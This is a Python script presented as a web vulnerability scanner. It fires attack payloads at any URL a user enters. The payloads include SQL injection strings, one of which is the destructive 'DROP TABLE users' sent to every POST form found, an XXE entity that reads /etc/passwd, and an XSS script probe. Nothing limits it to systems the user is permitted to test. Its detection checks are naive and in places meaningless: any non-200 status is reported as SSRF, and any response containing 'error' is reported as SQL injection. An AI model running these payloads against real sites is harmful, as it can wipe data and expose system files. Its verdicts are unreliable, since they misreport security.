import os
import requests
import logging
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from cache import cached_request
import time 

# Get the script directory
script_dir = os.path.dirname(os.path.realpath(__file__))

# Configure the logging settings
log_file_path = os.path.join(script_dir, 'vulnerability_scan1.log')
logging.basicConfig(filename=log_file_path, level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

flag1 = False

def generate_sql_injection_payloads():
    return [
        "admin' --",
        "admin' OR '1'='1",
        "1'; DROP TABLE users; --",
        # Add more payloads as needed
    ]

def log_info_separator(message):
    logging.info("\n" + "-" * 40)
    logging.info(f"{message}")
    print("\n" + "-" * 40)
    print(f"{message}")

def test_sql_injection_vulnerabilities(url, payloads):
    global flag1
    log_info_separator("Detection of SQL Injection Attack")
    try:
        response = cached_request(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all('form')

        logging.info(f"Using cached response for {url}")
        logging.info(f"Time taken for {url} from cache: {response.elapsed.total_seconds()} seconds")
        logging.info(f"Number of forms found at {url}: {len(forms)}")

        for payload in payloads:
            flag = False
            with ThreadPoolExecutor() as executor:
                futures = []

                for form in forms:
                    log_info_separator(f"Analyzing form at {url}")

                    # Get form action URL
                    form_action = form.get('action')
                    if not form_action or form_action.startswith('http'):
                        continue

                    # Assuming you want to analyze POST requests (you can customize this)
                    if form.get('method') == 'post':
                        logging.info(f"Potential POST request form found at {url}.")

                        # Construct data with payload for each input field
                        data = {field['name']: payload for field in form.find_all('input', {'name': True})}

                        # Submit the request with the payloads asynchronously
                        futures.append(executor.submit(requests.post, url + form_action, data=data))

                # Wait for all futures to complete
                responses = [future.result() for future in futures]

                # Analyze the responses for SQL injection indications
                for response in responses:
                    if "error" in response.text.lower():
                        logging.warning(f"SQL Injection TVulnerability Detected at {url} with payload: {payload}")
                        flag = True

            if not flag:
                print(f"The webpage at {url} is not vulnerable to SQL Injection.")
            else:
                print(f"The webpage at {url} is vulnerable to SQL Injection.")
                flag1 = True

    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SQL Injection detection: {e}")

# Your other vulnerability testing functions remain unchanged...

def test_xxe_vulnerabilities(url, xml_payload):
    global flag1
    log_info_separator("Detection of XXE (XML External Entity) Attack")
    try:
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(url, data=xml_payload, headers=headers)

        logging.info(f"Using cached response for {url}")
        logging.info(f"Time taken for {url} from cache: {response.elapsed.total_seconds()} seconds")

        if "XXE detected" in response.text:
            logging.warning(f"XXE TVulnerability Detected at {url}!")
            flag1 = True
            print(f"The webpage at {url} is vulnerable to XXE (XML External Entity) Attack.")
        else:
            logging.info(f"No XXE Vulnerability Detected at {url}.")
            print("No XXE Vulnerability Detected.")

    except Exception as e:
        logging.error(f"Error in XXE detection: {e}")

def test_xss_vulnerabilities(url):
    global flag1
    log_info_separator("Detection of XSS (Cross-Site Scripting) Attack")
    try:
        payload = "<script>alert('XSS Attack')</script>"

        # Send a GET request with the payload
        response = cached_request(url + "?parameter=" + payload)

        logging.info(f"Using cached response for {url + '?parameter=' + payload}")
        logging.info(f"Time taken for {url + '?parameter=' + payload} from cache: {response.elapsed.total_seconds()} seconds")

        # Check the response for the payload
        if payload in response.text:
            logging.warning(f"XSS TVulnerability Detected at {url}!")
            flag1 = True
            print(f"The webpage at {url} is vulnerable to XSS (Cross-Site Scripting) Attack.")
        else:
            logging.info(f"No XSS Vulnerability Detected at {url}.")
            print("No XSS Vulnerability Detected.")

    except requests.exceptions.RequestException as e:
        logging.error(f"Error in XSS detection: {e}")

def test_ssr_vulnerabilities(url):
    global flag1
    log_info_separator("Detection of SSRF (Server Side Request Forgery) Attack")
    try:
        response = cached_request(url)

        logging.info(f"Using cached response for {url}")
        logging.info(f"Time taken for {url} from cache: {response.elapsed.total_seconds()} seconds")

        if response.status_code == 200:
            logging.info(f"No SSRF Vulnerability Detected at {url}.")
            print("No SSRF Vulnerability Detected.")
        else:
            logging.warning(f"SSRF TVulnerability Detected at {url}! Status Code: {response.status_code}")
            flag1 = True
            print(f"The webpage at {url} is vulnerable to SSRF (Server Side Request Forgery) Attack.")

    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SSRF detection: {e}")

def is_webpage_vulnerable():
    # Check if any vulnerabilities were detected in the log file
    log_file_path = os.path.join(script_dir, 'vulnerability_scan1.log')
    try:
        with open(log_file_path, 'r') as log_file:
            log_content = log_file.read()
            return "TVulnerability Detected" in log_content
    except FileNotFoundError:
        return False

if __name__ == "__main__":
    url = input("Enter the URL for vulnerability detection: ")
    xml_payload = """
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <test>&xxe;</test>
    """

    # Log the start of the scan
    logging.info(f"Vulnerability scan started for {url}")

    start_time = time.time()

    # Generate SQL injection payloads
    payloads = generate_sql_injection_payloads()

    # Submit vulnerability tests asynchronously
    test_sql_injection_vulnerabilities(url, payloads)
    test_xxe_vulnerabilities(url, xml_payload)
    test_xss_vulnerabilities(url)
    test_ssr_vulnerabilities(url)

    # Record the end time
    end_time = time.time()

    # Calculate and print the overall time taken
    overall_time_taken = end_time - start_time
    print(f"\nOverall time taken for vulnerability detection at {url}: {overall_time_taken} seconds")

    if flag1:
        print(f"The webpage at {url} is potentially vulnerable. Check the log for details.")
    else:
        print(f"The webpage at {url} is not vulnerable.")